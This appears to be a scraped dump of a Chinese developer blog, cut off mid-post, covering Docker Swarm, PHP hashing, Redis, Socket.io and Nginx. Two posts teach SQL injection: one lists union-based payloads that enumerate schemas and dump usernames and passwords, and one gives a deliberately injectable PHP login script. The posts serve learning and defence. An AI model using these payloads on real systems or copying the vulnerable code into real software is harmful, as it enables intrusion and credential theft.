docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377 将myvm2 实例作为工作者加入（方式一）1234567$ docker-machine ssh myvm1docker@myvm1: $ docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377# 成功，会得到这样的输出This node joined a swarm as a worker. 直接通过 docker-machine ssh myvm1 执行相应命令 12$ docker-machine ssh myvm1 &quot;docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;# 同上 将myvm2 实例作为工作者加入（方式二）执行上面得到的输出： 123456$ docker-machine ssh myvm2 &quot; docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377&quot;# 成功，会得到这样的输出This node joined a swarm as a worker. 这样，我们就成功的创建了一个集群，并将一个工作者作为一个节点加入了。 在管理器上查看集群中的节点：1234docker@myvm1: $ docker node lsID HOSTNAME STATUS AVAILABILITY MANAGER STATUSrihwohkh3ph38fhillhhb84sk * myvm1 Ready Active Leaderbrtu9urxwfd5j0zrmkubhpkbd myvm2 Ready Active 为什么上面要介绍那两种与 VM 实例进行交互的方式呢？ 因为会和后面的在集群部署应用程序有一定联系。 在集群中部署应用程序在开始部署之前，我们需要了解到有两种方式可以实现。 docker-machine 为Swarm 管理器配置Shell 到目前为止，我们与 VM 通信都是通过 docker-machine ssh这种方式，另一种更好的方式就是：将当前shell配置为与VM上的Docker守护程序通信。 这样我们就可以直接本地的docker-compose.yml文件远程部署应用程序，而无需将其复制到其他任何位置。 12345678910$ docker-machine env myvm1export DOCKER_TLS_VERIFY&#x3D;&quot;1&quot;export DOCKER_HOST&#x3D;&quot;tcp:&#x2F;&#x2F;192.168.99.100:2376&quot;export DOCKER_CERT_PATH&#x3D;&quot;&#x2F;Users&#x2F;sam&#x2F;.docker&#x2F;machine&#x2F;machines&#x2F;myvm1&quot;export DOCKER_MACHINE_NAME&#x3D;&quot;myvm1&quot;# Run this command to configure your shell:# eval $(docker-machine env myvm1)# 运行最后一行命令以配置与之通信的 shell $ eval $(docker-machine env myvm1) # eval $(sudodocker-machine env myvm1) 运行docker-machine ls 已验证 myvm1 现在是活动的计算机。带有星号（*）表示配置成功 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 * virtualbox Running tcp:&#x2F;&#x2F;192.168.99.100:2376 v17.06.2-cemyvm2 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.101:2376 v17.06.2-ce 部署应用程序 123$ lsdocker-compose.yml$ docker stack deploy -c docker-compose.yml getstartedlab 传统方式 传统的方式就是将docker-compose.yml文件拷贝到对应的管理器中。 1234# 使用scp 命令将文件拷贝到 vm 实例中$ lsdocker-compose.yml$ docker-machine scp docker-compose.yml myvm1:~ 部署应用程序 12345678# 这里就可以随意选择使用之前介绍的方式一或者方式二# 方式一$ docker-machine ssh myvm1 &quot;docker stack deploy -c docker-compose.yml getstartedlab&quot;# 方式二$ docker-machine ssh myvm1docker@myvm1: $ docker stack deploy -c docker-compose.yml 耐心等待一会，就可以看到看到部署成功了。 访问集群在访问集群之前，你需要知道以下两件事： 访问集群的IP 地址是VM 的IP，使用docker-machine ls查看 是否存在端口号，取决于你的docker-compose.yml文件 Docker 常用命令容器的生命周期创建一个新的容器并运行： 123456789$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...]$ docker run ubuntu:15.10 &#x2F;bin&#x2F;echo &quot;Hello world&quot;# 解释：Docker以ubuntu15.10镜像创建一个新容器，然后在容器里执行 bin&#x2F;echo &quot;Hello world&quot;，最后输出结果。参数* -d：让容器在后台运行* -p：内部容器绑定到指定的主机端口上* -P：内部容器端口随机映射到主机端口上* --name：给容器命名，如果不加--name 参数，Docker 会自动命名。 杀掉一个运行中的容器： 12$ docker kill -s KILL mydocker# mydocker 表示Contianer ID或者Name 结束停止一个运行中的容器： 12$ docker container stop mydocker# mydocker 表示Container ID或者Name 查看正在运行的容器： 123456$ docker ps参数* -l：查询最后一次创建容器记录* --all：查询所有创建容器记录* -aq：查询所有创建容器的Container ID 停止Web 应用容器 这个只是停止该容器的运行，并没有杀死 1$ docker stop mydocker 启动Web 应用容器 已经停止的容器，可以使用命令 docker start 来启动。 1$ docker start mydocker 移除Web 应用容器 123$ docker rm mydockermydocker# 删除容器时，容器必须是停止状态，否者会报错。 镜像操作如何创建一个Docker 镜像 1$ docker build --tag&#x3D;mydockerapp # 注意：标签名只能小写 列出下载到计算机中的镜像 12345678910$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest fce289e99eb9 3 months ago 1.84kB各个选项说明:* REPOSITORY：表示镜像的仓库源* TAG：镜像的标签* IMAGE ID：镜像ID* CREATED：镜像创建时间* SIZE：镜像大小 查找镜像 123456789$ docker search nginx NAME DESCRIPTION STARS OFFICIAL nginx Official build of Nginx. 11154 [OK]NAME:镜像仓库源的名称DESCRIPTION:镜像的描述OFFICIAL:是否docker官方发布 获取一个新镜像 如果我们决定使用上图中的 nginx 官方镜像，使用如下命令： 1$ docker pull nginx 容器操作列出下载到计算机中的 container 12$ docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 仓库操作登入hub.docker.com 12$ docker login # 前提是先注册号账号 标记镜像，以便上传至目标位置 12$ docker tag mydocker aikang&#x2F;get-started:part1# 最后上传至所登入的Docker Hub仓库 将标记的镜像上传到存储库： 1$ docker push mydocker aikang&#x2F;get-started:part1 从远程存储库中拉出并运行映像 1$ docker run -d -p 4000:80 aikang&#x2F;get-started:part1 注意：无论在哪里执行docker run，它都会提取你的镜像，以及Python和所有依赖项requirements.txt，并运行你的代码。它们都在一个整洁的小包中一起旅行，你不需要在主机上安装任何东西让Docker运行它。 服务操作群集初始化，可以使节点变成群集管理器 1$ docker swarm init 以服务运行 1234$ docker stack deploy -c docker-compose.yml getstartedlabCreating network getstartedlab_webnetCreating service getstartedlab_web# 需要有一个docker-compose.yml 文件 列出与应用程序关联的正在运行的服务 1$ docker service ls 查看与堆栈相关的所有服务 12$ docker stack services getstartedlab# getstartedlab 表示服务的Names 列出服务任务 12$ docker service ps getstartedlab# getstartedlab 表示服务的Names 关闭服务 12$ docker stack rm getstartedlab# getstartedlab 表示服务的Names 查看集群中的节点 1$ docker node ls VM 交互创建一个VM 实例（Win、Mac、Linux） 1$ docker-machine create --driver virtualbox myvm1 使用ssh 连接VM 实例 1$ docker-machine ssh myvm1 查看关于节点的基本信息 1$ docker-machine env myvm1 使用scp命令将本地文件copy到VM实例中 12$ docker-machine scp &lt;filename&gt; myvm1:~ # 从当前目录拷贝到实例中的根目录下 删除指定VM 1$ docker-machine rm myvm1 将Shell 与VM 连接 1$ eval $(docker-machine env myvm1) 将Shell 与VM 断开，使用本地连接 1$ eval $(docker-machine env -u) 集群操作以下操作均需要在VM CLI 中运行 初始化集群 1$ docker swarm init --advertise-addr &lt;myvm1 ip&gt; 将节点加入集群 1$ docker swarm join --token &lt;token&gt; &lt;ip&gt;:2377&quot; 让工作者离开集群 1$ docker swarm leave 强制离开并关掉集群 1$ docker swarm leave -f 查看该节点的详情信息 1$ docker node inspect &lt;node ID&gt; 部署应用程序 1$ docker stack deploy -c &lt;file&gt; &lt;app&gt; 杂项查看Docker版本： 1$ docker version 显示Docker系统信息，包括镜像和容器数： 1$ docker info 查看Docker 容器的配置和状态信息。 12$ docker inspect mydocker# 表示容器的Container ID 或者Names 查看指定容器映射到宿主机的端口号。 123$ docker port mydocker80&#x2F;tcp -&gt; 0.0.0.0:4000# mydocker 表示该应用的Container ID 或者Names 查看Web 应用程序日志 12345$ docker logs -f mydocker * Running on http:&#x2F;&#x2F;0.0.0.0:80&#x2F; (Press CTRL+C to quit)113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:34] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:35] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -# mydocker 表示该应用的Container ID 或者是Names 查看Web 应用程序容器的进程 1234$ docker top mydocker # UID PID PPID C STIME TTY TIME CMDroot 22358 22323 0 20:58 ? 00:00:00 python app.py 杂项容器有哪些网络模式1. None在该模式下容器没有对外网络，本地机只有一个回路地址 2. Container在该模式下，与另一个容器共享网络 3. Host在该模式下，与主机共享网络 4. Bridge该模式为Docker 默认的网络模式，在这种模式下，Docker 容器与外部的通信都是通过 iptable 实现的。 5. Overlay该模式为Docker 目前原生的跨主机多子网模型，主要是通过 vxlan 技术实现。 参考链接 Docker 入门教程 - 阮一峰网络日志 Docker 入门 - 极客学院 安装Docker ce - 官方文档 Docker Swarm 入门教程 如何在Ubuntu 18.4上安装 Docker-ce 如何在Ubuntu 18.04上安装Docker Machine 如何在Ubuntu 18.04上安装VirtualBox","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"PHP 中使用 hash_hmac 加密","slug":"php-uses-hash-hmac-encryption","date":"2020-07-22T16:18:45.000Z","updated":"2020-07-22T16:20:05.453Z","comments":true,"path":"php-uses-hash-hmac-encryption/","link":"","permalink":"https://www.0x2beace.com/php-uses-hash-hmac-encryption/","excerpt":"今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用Node写的，需要翻译成PHP 版本的。","text":"今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用Node写的，需要翻译成PHP 版本的。 PHP中使用 Hmac 方法生成带有密钥的哈希值在Node.js 中，这是一段用于生成“加盐”的哈希值。 12345678var crypto &#x3D; require(&#39;crypto&#39;);var secret &#x3D; &quot;122410&quot;var key &#x3D; &quot;key&quot;var hash &#x3D; crypto.createHmac(&#39;sha256&#39;, secret).update(key).digest(&#39;hex&#39;)console.log(hash);&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4 如果要翻译成PHP版本，其实非常简单，直接使用PHP 的 hash_hmac函数就可以了。 12345&lt;?php$secret &#x3D; &quot;122410&quot;; $key &#x3D; &quot;key&quot;;echo hash_hmac(&quot;sha256&quot;, $key, $secret);&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4 将密钥设置成二进制如果需要加密的部分，并不是普通的字符串，而是二进制字符串，那么需要使用pack函数。 1234var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;));&#x2F;&#x2F; 5e50e6458b0cdc7ee534967d113a9deffe6740d0&#x2F;&#x2F; 预期结果：46abe81345b1da2f1a330bba3d6254e110cd9ad8 先将十六进制字符串转换为二进制数据，然后再将其传递给hash_hmac： 123var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, pack(&quot;H*&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;)));&#x2F;&#x2F; 46abe81345b1da2f1a330bba3d6254e110cd9ad8 Node中使用crypto进行md5 加密在PHP 中，如果需要获取某个字符串的md5 加密之后的哈希值，非常简单，直接使用md5 函数即可。 但是在node.js 中，并没有为我们直接提供这样的函数，所以需要手动调用crypto 模块去转换： 1234var pwd &#x3D; &quot;122410&quot;;var hash &#x3D; crypto.createHash(&#39;md5&#39;).update(pwd).digest(&#39;hex&#39;);&#x2F;&#x2F; 913975c2f972ba6bbf5ba593c68a5dc5 参考链接 如何在PHP中将hmac sha1密钥设置为十六进制？ 在线转换工具 php hash_hmac 函数 node.js crypto 模块","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Hash","slug":"Hash","permalink":"https://www.0x2beace.com/tags/Hash/"}]},{"title":"整理常见的 SQL 注入语句","slug":"organize-common-sql-injection-statements","date":"2020-07-22T15:30:04.000Z","updated":"2020-07-22T15:31:27.367Z","comments":true,"path":"organize-common-sql-injection-statements/","link":"","permalink":"https://www.0x2beace.com/organize-common-sql-injection-statements/","excerpt":"这篇笔记的目的是整理各种 SQL 注入使用时的payload。","text":"这篇笔记的目的是整理各种 SQL 注入使用时的payload。 说明：以下的payloads都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。 也就是基于这样一种情况： 1SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;; Payload 判断当前数据表中有几列： 1?id&#x3D;1&#39; order by 数值 --+ 查看显示位在第几列： 1?id&#x3D;-1&#39; union select 1,2,3 --+ 注意：这里需要传递一个不存在的条件，比如：id=-1 显示当前数据库（假设显示位中包含第三位）： 1?id&#x3D;-1&#39; union select 1,2,database() --+ 查看当前数据库中的所有表： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+ 函数group_concat()把所有结果都在一行输出 查询所有数据库： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+ 查询某个数据库中的表： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+ 查询某个表中的所有字段： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+ 查询某个表中的字段内容 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users) 0x3a会被转义位冒号： UnionSQL UNION 操作符合并两个或多个 SELECT 语句的结果，需要注意的是：UNION 内部的每个 SELECT 语句必须拥有相同数量的列。 参考链接Web安全学习之数据库注入语句的收集和学习","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"认识SQL 注入常见方式","slug":"know-common-ways-of-sql-injection","date":"2020-07-22T15:26:11.000Z","updated":"2020-07-22T15:29:48.375Z","comments":true,"path":"know-common-ways-of-sql-injection/","link":"","permalink":"https://www.0x2beace.com/know-common-ways-of-sql-injection/","excerpt":"最近需要做一个检测SQL 注入的功能，无奈发现自己于对SQL 注入竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。","text":"最近需要做一个检测SQL 注入的功能，无奈发现自己于对SQL 注入竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。 SQL 注入是什么？SQL 注入是一种将SQL 语句添加到REQUEST 参数中，传递到服务器并执行的一种攻击手段。 SQL 注入攻击是REQUEST 引數未经过过滤，然后直接拼接到SQL 语句中，解析并执行，而达到预想之外的一种行为。 SQL 注入是怎样产生的 WEB 开发人员无法保证所有的输入都已经完美过滤。 数据库未做安全配置，存在安全隐患。 如何进行SQL 注入这里以PHP、Mysql为例，介绍一下完整的SQL 注入攻击是如何产生的。 回显注入1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php$db_host &#x3D; &quot;localhost&quot;;$db_user &#x3D; &quot;root&quot;;$db_pwd &#x3D; xxxxxx;$db_name &#x3D; &quot;User&quot;;$db_table &#x3D; &quot;Student&quot;;echo &#39;&lt;h1&gt;&#39;;echo &#39;Test ErrorBased Injections&#39;;echo &#39;&lt;&#x2F;h1&gt;&#39;;error_reporting(E_ALL ^ E_DEPRECATED);&#x2F;&#x2F; 测试连接$conn &#x3D; mysqli_connect($db_host, $db_user, $db_pwd);if (!$conn)&#123; echo &#39;Mysql 连接失败:&#39;.mysqli_error($conn);&#125;else &#123; echo &#39;Mysql 连接成功&#39;;&#125;echo &#39;&lt;hr&gt;&#39;;&#x2F;&#x2F;连接数据库mysqli_select_db($conn, $db_name) or die (&quot;无法连接到数据库: &quot;.$db_name);mysqli_query($conn, &#39;set names utf-8&#39;);&#x2F;&#x2F; 获取参数if(isset($_GET[&#39;id&#39;]))&#123; $id&#x3D;$_GET[&#39;id&#39;];&#125;&#x2F;&#x2F; 拼接SQL语句$sql&#x3D; &quot;SELECT * FROM $db_table WHERE id &#x3D; &#123;$id&#125; &quot;;echo &#39;查询SQL 语句:&#39;.$sql;echo &#39;&lt;hr&gt;&#39;;&#x2F;&#x2F;执行$result&#x3D;mysqli_query($conn, $sql);$row&#x3D;mysqli_fetch_array($result, MYSQLI_BOTH);if($row) &#123; echo &#39;Your Login name:&#39;.$row[&#39;username&#39;]; echo &#39;&lt;hr&gt;&#39;; echo &#39;Your Password:&#39;.$row[&#39;password&#39;];&#125;?&gt; 调用地址是http://127.0.0.1/sqli.php?id=1，使用GET传入参数id，输出的SQL 语句如下： 1SELECT * FROM Student WHERE id &#x3D; &#39;1&#39; 正常情况下，会返回id = 1 的学生信息。 1. 数字注入如果在浏览器中输入：http://127.0.0./sqli.php?id=1&#39; union select 1,2--+会怎样呢？输出的SQL 语句如下： 1SELECT * FROM Student WHERE id &#x3D; -1 or 1&#x3D;1 这会导致所有的学生信息都被输出了，为什么会这样呢？这是因为id = -1是一个不存在的条件，而1 = 1却是一个永远存在的条件，这就相当于没有加 Where 条件。 2. 字符串注入现在有这样一种场景：http://127.0.0./login.php模拟用户登录。假设正确的用户名和密码是Boo、122410，那么在正常的登录情况下所执行的SQL 语句如下： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; ADN password &#x3D; &#39;122410&#39; 由于用户名和密码都是字符串，所以SQL 注入会把参数携带的数据变成Mysql中的注释。Mysql 中的注释有两种。 1. #假设POST 传递的参数分别是：username = Boo&#39;#、password = xxxxxx，那么产生的SQL 语句则是： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;#&#39;ADN password &#x3D; &#39;xxxxxx&#39; 因为#号 后的所有字符串都会被当成注释来处理，所以上面的SQL 语句等价于： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; 2. --假设POST请求传递的参数分别是：username = Boo&#39;--、password = xxxxxx，那么产生的SQL 语句则是： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;-- &#39;AND password &#x3D; &#39;xxxxxx&#39; 因为--号 后面的所有内容都会被当成注释处理，所以上面的SQL 语句等价于： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; 无论是上面的哪一种情况，攻击者都能在不知道具体密码的情况下而成功登录。 这大概就是一个简单的SQL注入产生的完整过程了，这里只是抛砖引玉的介绍了下原理，而实际场景中的SQL 注入当然远远不止这两种。 参考链接SQL 注入常见方式以及检测方法","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"Redis 常见事件整理","slug":"redis-common-events-collation","date":"2020-07-21T15:41:45.000Z","updated":"2020-07-21T15:42:45.608Z","comments":true,"path":"redis-common-events-collation/","link":"","permalink":"https://www.0x2beace.com/redis-common-events-collation/","excerpt":"这篇笔记用来整理 Redis 的常用事件。","text":"这篇笔记用来整理 Redis 的常用事件。 客户端事件客户端会发出一些事件的状态连接到Redis 服务器。 ReadyError客户端连接Redis 时，如果出现异常，则会触发Error 事件。 Connect客户端连接至Redis 时，会触发连接事件。 订阅者事件Message将接收到来自订阅频道的消息， 123client.on(&quot;message&quot;, function (channel, message) &#123; ...&#125;) Subscribe监听订阅事件，返回订阅频道的订阅数量。 123client.on(&quot;subscribe&quot;, function (channel, count) &#123; ...&#125;) 发布/订阅Publish将信息 message 发送到指定的频道 channel 。 返回值：接收到信息 message 的订阅者数量。 1PUBLISH channel message SUBSCRIBE订阅给定频道的信息。 返回值：接收到的信息。 1SUBSCRIBE channel [channel ...] 参考链接 Redis命令参考简体中文版 A high performance Node.js Redis client","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Socket.io 快速上手","slug":"socket-io-quick-start","date":"2020-07-20T05:02:05.000Z","updated":"2020-07-20T05:04:22.840Z","comments":true,"path":"socket-io-quick-start/","link":"","permalink":"https://www.0x2beace.com/socket-io-quick-start/","excerpt":"最近使用socket.io 和 redis 完成了一些小功能，觉得很实用，所以整理一下socket.io相关的知识。","text":"最近使用socket.io 和 redis 完成了一些小功能，觉得很实用，所以整理一下socket.io相关的知识。 socket.io 是什么它是一个服务端与客户端之间建立通讯的工具。 服务端创建好服务之后，客户端通过主机与之建立连接。然后就可以进行通讯了。 想要使用好socket.io，一定要理解通讯的概念。通讯一定是双向的，如果客户端能够收到消息，那么在某个地方就一定存在服务端向客户端推送消息。 快速上手要开始使用socket.io进行开发，需要先安装Node和npm。 创建一个名为app.js的文件，并添加以下代码。 12345678910111213141516var app &#x3D; require(&#39;express&#39;)();var http &#x3D; require(&#39;http&#39;).Server(app);&#x2F;&#x2F; 创建一个附加到http服务器的新socket.io实例var io &#x3D; require(&#39;socket.io&#39;)(http);app.get(&#39;&#x2F;&#39;, function(req, res)&#123; res.sendFile(__dirname + &#39;&#x2F;index.html&#39;);&#125;);io.on(&#39;connection&#39;, function(socket)&#123; console.log(&#39;a user connected&#39;);&#125;);http.listen(3000, function()&#123; console.log(&#39;listening on *:3000&#39;);&#125;); 这样就完成了一个最简单的socket服务端。 创建index.html 文件来作为客户端提供服务。 1234567&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 启动服务 1node app.js 创建的服务运行在本地的 3000 端口上，打开浏览器，输入http://localhost:3000进行访问。 使用事件socket.io 的核心理念就是允许发送、接收任意事件和任意数据。任意能被编码为 JSON 的对象都可以用于传输。二进制数据 也是支持的。 在上面的代码中，我们已经创建了一个服务端的socket.io对象，如果想要能正常通讯，还需要在客户端同样也创建一个socket.io对象。这个脚本由服务端的/socket.io/socket.io.js 提供。 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; var socket &#x3D; io(); &lt;&#x2F;script&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 在客户端中建立 socket.io 连接。 在服务端中添加以下代码： 12345678910111213 ...&#x2F;&#x2F; 只有有客户端连接，就会触发这个事件io.on(&#39;connection&#39;, function(socket) &#123; console.log(&#39;A user connected&#39;); &#x2F;&#x2F; 只有有客户端断开连接，就会触发这个事件 socket.on(&#39;disconnect&#39;, function () &#123; console.log(&#39;A user disconnected&#39;); &#125;);&#125;); ... 现在再次访问http://localhost:3000，不仅可以在浏览器中看见hello world，如果刷新浏览器，还能在控制台中看见以下内容： 123A user connectedA user disconnectedA user connected 在上面的案例中，我们使用了socket.io的connection和disconnect事件，socket.io还有很多其中事件。 事件处理在服务端中有以下是保留字： Connect Message Disconnect Reconnect Ping Join and Leave 在客户端中以下是保留字： Connect Connect_error Connect_timeout Reconnect, etc 常用API客户端 提供的一些用于处理错误/异常的API。 1234567891011121314151617Connect − When the client successfully connects.Connecting − When the client is in the process of connecting.Disconnect − When the client is disconnected.Connect_failed − When the connection to the server fails.Error − An error event is sent from the server.Message − When the server sends a message using the send function.Reconnect − When reconnection to the server is successful.Reconnecting − When the client is in the process of connecting.Reconnect_failed − When the reconnection attempt fails. 广播广播意味着向所有连接的客户端发送消息。 要向所有客户端广播事件，我们可以使用io.sockets.emit方法。 12345678910111213 ...var clients &#x3D; 0;io.on(&#39;connection&#39;, function(socket) &#123; clients++; io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;); socket.on(&#39;disconnect&#39;, function () &#123; clients--; io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;); &#125;);&#125;); ... 广播在socket.io中应用的非常多，有广播就意味着有接收。需要在客户端中处理广播事件： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; var socket &#x3D; io(); socket.on(&#39;broadcast&#39;,function(data) &#123; document.body.innerHTML &#x3D; &#39;&#39;; document.write(data.description); &#125;); &lt;&#x2F;script&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 可以尝试打开多个浏览器，输入http://localhost:3000，可能会得到以下结果： 参考链接 Socket.io Tutorial","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Socket.io","slug":"Node/Socket-io","permalink":"https://www.0x2beace.com/categories/Node/Socket-io/"}],"tags":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"}]},{"title":"Nginx 常见配置","slug":"nginx-common-configuration","date":"2020-07-19T10:22:26.000Z","updated":"2020-07-19T10:24:25.144Z","comments":true,"path":"nginx-common-configuration/","link":"","permalink":"https://www.0x2beace.com/nginx-common-configuration/","excerpt":"最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。","text":"最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。 多站点配置如果一台服务器，需要配置多套站点，推荐使用 IP + 端口配置站点，然后使用反向代理指向端口。 站点配置 12345678910server &#123; listen 40001; location ~ \\.php &#123; ... &#125; location &#x2F; &#123; ... &#125;&#125; 多站点配置 123456789101112131415161718192021&#x2F;&#x2F; 站点1 server &#123; server_name yoursite.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125;&#x2F;&#x2F; 站点2server &#123; server_name yoursite2.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; 反向代理反向代理其实已经在上面的配置中出现过了，多站点配置的原理就是利用反向代理。 123456789server &#123; server_name yoursite2.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; SSL 配置申请好证书之后，将其放在服务器上，然后编辑Nginx 配置： 12345678910111213server &#123; server_name yoursite.com; listen 443 ssl; ssl on; ssl_certificate ssl_0123cp_net&#x2F;full_chain.pem; &#x2F;&#x2F; 证书所在路径 ssl_certificate_key ssl_0123cp_net&#x2F;private.key; &#x2F;&#x2F; 证书对应的私钥所在路径 location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; http重定向配置好 https之后，还需要做一件事，才能保证 https能够正常访问。 因为访问任何一个网站时，默认使用的是http协议，所以需要在Web Server中配置http 自动跳转 https。 123456server &#123; server_name yoursite.com; listen 80; rewrite ^(.*) https:&#x2F;&#x2F;$server_name$1 permanent;&#125;","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Mac 开启 Mysql 日志记录","slug":"mac-open-mysql-logging","date":"2020-07-19T09:24:43.000Z","updated":"2020-07-20T05:06:44.373Z","comments":true,"path":"mac-open-mysql-logging/","link":"","permalink":"https://www.0x2beace.com/mac-open-mysql-logging/","excerpt":"有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。","text":"有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。 进入Mysql 命令行 1mysql -hlocalhost -uroot -p 全局开启普通日志记录 1set global general_log&#x3D;on; 查看Mysql 日志文件所在目录 1show variables like &#39;general_log_file&#39;; 实时查看日志记录 1tail -f &#x2F;your_mysql_log_file_path","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Mysql 行锁原因分析","slug":"analysis-of-the-causes-of-mysql-row-lock","date":"2020-07-19T09:03:04.000Z","updated":"2020-07-19T09:11:47.872Z","comments":true,"path":"analysis-of-the-causes-of-mysql-row-lock/","link":"","permalink":"https://www.0x2beace.com/analysis-of-the-causes-of-mysql-row-lock/","excerpt":"这篇文章来浅谈一下什么是Mysql 